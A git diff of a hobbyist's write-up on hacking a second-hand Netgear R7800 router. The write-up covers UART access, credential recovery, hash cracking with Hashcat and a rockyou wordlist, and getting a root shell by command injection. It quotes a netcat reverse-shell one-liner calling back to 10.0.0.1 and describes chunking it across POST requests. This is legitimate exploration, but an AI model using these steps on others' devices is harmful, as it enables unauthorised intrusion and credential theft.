@@ -6,13 +6,13 @@ I found a Netgear R7800 at a local thrift store, it was priced at $9.99 but it w
 <img src="https://github.com/maguireja/netgear/blob/b1546eec3635e6b43bf14a6fd5d3226c1ab586a2/netgear.png">
 
 # Powering up
-I plugged in the router and to my surprise, the router had not been reset to a factory default before being donated. I observed the following SSID broadcasted:
+To my surprise, the router had not been reset to a default config before being donated. I observed the following SSID broadcasted:
 <img src="https://github.com/maguireja/netgear/blob/92d5ef63adb5aaa382886b7a4d19818efef5f901/SSID.png">
 ...do with that what you will...
 
 # Password Recovery
-Now that I realized the router was still configured, I wondered if I could recover the password for the wireless network, as well as any other configured passwords. I followed along with Matt Brown's video here which was fantastic. I recommend subscribing to Matt's channel he has some really good content.
-Video here: https://youtu.be/7iuwY3hIcHw?si=osBN4qiOezMgb0qB
+Now that I realized the router was still configured, I wondered if I could recover the pre shared key for the wireless network, as well as any other configured passwords. I followed along with Matt Brown's video here which was fantastic. I recommend subscribing to Matt's channel he has some really good content.
+Matt's video here: https://youtu.be/7iuwY3hIcHw?si=osBN4qiOezMgb0qB
 
 # Locating UART
 I opened up the case and found four pins that look like UART, but they were not labeled. I was able to follow the steps in Matt's video and use a multimeter to locate the Ground, Send and Recieve pins.
@@ -86,7 +86,7 @@ Analyzing 'REDACTED'
 --End of file 'hash'--
 ```
 
-The only hash type here that I'm remotely familiar with is SHA-256, so I thought I'd take a chance and try cracking the string as a SHA-256 hash.  I used Hashcat with the rockyou2024 wordlist and the rockyou-30000 ruleset:
+I thought I'd take a chance and try cracking the string as a SHA-256 hash.  I used Hashcat with the rockyou2024 wordlist and the rockyou-30000 ruleset:
 ```
 ./hashcat.bin -a 0 -m 1400 test-hash ~/tools/wordlists/rockyou2024.txt -r rules/rockyou-30000.rule
 ```
@@ -191,33 +191,6 @@ MMMM$ ,MMMMM  MMMMM  MMMM    MMM       MMMM   MMMMM   MMMM    MMMM
 ```
 And it works! It does require a password, and the password is the same password for the web interface. I am not sure how exactly the new telnet server knows where to find this password. This needs more research
 
-Mount Output
-```
-root@R7800:~# mount
-rootfs on / type rootfs (rw)
-/dev/root on /rom type squashfs (ro,relatime)
-proc on /proc type proc (rw,relatime)
-sysfs on /sys type sysfs (rw,relatime)
-tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime,size=0k)
-tmpfs on /dev type tmpfs (rw,relatime,size=512k,mode=755)
-devpts on /dev/pts type devpts (rw,relatime,mode=600)
-none on /proc/bus/usb type usbfs (rw,relatime)
-ubi0:overlay_volume on /overlay type ubifs (rw,relatime)
-overlayfs:/overlay on / type overlayfs (rw,relatime,lowerdir=/,upperdir=/overlay)
-debugfs on /sys/kernel/debug type debugfs (rw,relatime)
-```
-
-crontab outout
-```
-root@R7800:~/etc/crontabs# pwd
-/tmp/etc/crontabs
-root@R7800:~/etc/crontabs# ls
-root
-root@R7800:~/etc/crontabs# cat root 
-0 2 * * * 11k_scan &
--25 02 * * * streamboost update_fmn; streamboost auto_upload; streamboost auto_update && streamboost restart
-```
-
 # Enabling Telnet
 I spent awhile trying to figure out how to get the telnet binary to run on boot, and didn't have any luck. While researching, I found that the version of firmware on my router supports a special debugging page. On the debugging page, you can simply enable telnet:
 <img src="https://github.com/maguireja/netgear/blob/main/Screenshot_2025-02-28_11-45-43.png?raw=true">
@@ -290,8 +263,33 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
-The next issue I ran into was length. Because the payload is appended to the access key, you can only send about 25 characters in a single post request. My solution was to just echo the oneliner into a bash script over 4 or 5 post requests, change the permission then execute the bash script. There may be a better way but I was able to get this to work.
+The next issue I ran into was length. Because the payload is appended to the access key, you can only send a limited number of characters in a single post request. My solution was to just echo the oneliner into a bash script over 4 or 5 post requests, change the permission then execute the bash script. I'm sure there's a better way but I was able to get this to work.
 <img src="https://github.com/maguireja/netgear/blob/main/shell.gif?raw=true">
 
-#TODO
+# TODO
+Mount Output
+```
+root@R7800:~# mount
+rootfs on / type rootfs (rw)
+/dev/root on /rom type squashfs (ro,relatime)
+proc on /proc type proc (rw,relatime)
+sysfs on /sys type sysfs (rw,relatime)
+tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime,size=0k)
+tmpfs on /dev type tmpfs (rw,relatime,size=512k,mode=755)
+devpts on /dev/pts type devpts (rw,relatime,mode=600)
+none on /proc/bus/usb type usbfs (rw,relatime)
+ubi0:overlay_volume on /overlay type ubifs (rw,relatime)
+overlayfs:/overlay on / type overlayfs (rw,relatime,lowerdir=/,upperdir=/overlay)
+debugfs on /sys/kernel/debug type debugfs (rw,relatime)
+```
 
+crontab outout
+```
+root@R7800:~/etc/crontabs# pwd
+/tmp/etc/crontabs
+root@R7800:~/etc/crontabs# ls
+root
+root@R7800:~/etc/crontabs# cat root 
+0 2 * * * 11k_scan &
+-25 02 * * * streamboost update_fmn; streamboost auto_upload; streamboost auto_update && streamboost restart
+```
